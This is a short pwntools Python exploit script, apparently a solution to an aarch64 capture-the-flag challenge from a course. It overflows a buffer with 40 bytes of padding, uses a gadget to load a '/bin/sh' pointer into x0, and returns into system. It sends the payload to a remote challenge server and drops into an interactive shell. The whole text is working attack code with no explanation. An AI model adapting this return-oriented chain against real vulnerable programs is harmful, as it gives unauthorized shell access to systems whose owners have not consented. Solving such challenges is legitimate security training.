from pwn import *

e = context.binary = ELF('./chal.bin')
r = ROP(e)

p = remote("cse4850-aarch64-1.chals.io", 443, ssl=True, sni="cse4850-aarch64-1.chals.io")

chain = b'A' * 40				# overflow

#print(chain)

chain += p64(0x400854)				# weird machine gadget -> x0, x1, x29, x30

chain += p64(next(e.search(b'/bin/sh')))    	# x0 ->find /bin/sh
chain += p64(0)					# x1
chain += p64(0)					# x29
chain += p64(e.sym['system'])			# x30 -> call system

p.sendline(chain)
p.interactive()
